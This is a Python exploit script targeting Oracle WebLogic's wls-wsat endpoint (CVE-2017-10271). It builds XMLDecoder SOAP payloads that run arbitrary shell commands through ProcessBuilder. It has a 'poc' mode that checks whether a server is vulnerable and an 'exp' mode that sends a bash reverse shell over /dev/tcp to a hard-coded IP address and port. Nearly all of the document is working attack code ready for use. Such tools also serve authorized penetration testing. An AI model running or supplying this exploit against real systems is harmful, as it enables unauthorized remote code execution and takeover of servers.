'''
Description: Oracle WebLogic wls-wsat RCE
CVE: CVE-2017-10271
CNVD: 
Version: 1.0
Author: isok
Date: 2022-02-06 11:14:25
LastEditTime: 2022-02-14 16:17:54
'''

import argparse
import requests
from html import escape


'''
name: payload
msg: 生成反弹payload
param {*} command
return {*}
'''
def payload(command):
    command_str = escape(command)
    payload = """
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>""" + command_str + """</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
    """
    return payload

'''
name: poc   
msg: 根据 Servlet 中的 getServletOutputStream() 方法进行漏洞验证
param {*} target_url
param {*} target_port
return {*}
'''
def poc(target_url, target_port):
    url = target_url + ":" + str(target_port) + "/wls-wsat/CoordinatorPortType"
    payload = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><void class="java.lang.Thread" method="currentThread"><void method="getCurrentWork"><void method="getResponse"><void method="getServletOutputStream"><void method="write"><array class="byte" length="9"><void index="0"><byte>50</byte></void><void index="1"><byte>50</byte></void><void index="2"><byte>53</byte></void><void index="3"><byte>55</byte></void><void index="4"><byte>55</byte></void><void index="5"><byte>51</byte></void><void index="6"><byte>48</byte></void><void index="7"><byte>57</byte></void><void index="8"><byte>50</byte></void></array></void><void method="flush"/></void></void></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope></soapenv:Envelope>
    """
    headers = {
        "Content-Type": "text/xml"
    }
    try:
        res = requests.post(url, data=payload, headers=headers)
        if res.status_code == 200 and "225773092" in res.text:
            print("[+] {0} 存在漏洞".format(url))
    except Exception as e:
        pass


'''
name: revshell
msg: 反弹shell
param {*} target_url
param {*} target_port
return {*}
'''
def revshell(target_url, target_port):
    url = target_url + ":" + str(target_port) + "/wls-wsat/CoordinatorPortType"
    headers = {
        "Content-Type": "text/xml"
    }
    try:
        command = "bash -i >& /dev/tcp/192.168.174.141/8888 0>&1"
        res = requests.post(url, headers=headers, data=payload(command))
        if res.status_code == 500 and "Couldn't create" not in res.text:
            print("[+] {0} 反弹成功".format(url))
    except Exception as e:
        print("[-] {0} 反弹出错".format(url))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Oracle WebLogic wls-wsat RCE")
    parser.add_argument("choice", type=str, choices=["poc", "exp"], help="choice poc or exp")
    parser.add_argument("-u", "--url", dest="URL", type=str, required=True, help="target url (http://url)")
    parser.add_argument("-p", "--port", dest="PORT", default=7001, type=int, help="target port")
    args = parser.parse_args()
    if args.choice == "poc":
        poc(args.URL, args.PORT)
    elif args.choice == "exp":
        revshell(args.URL, args.PORT)
    else:
        exit
    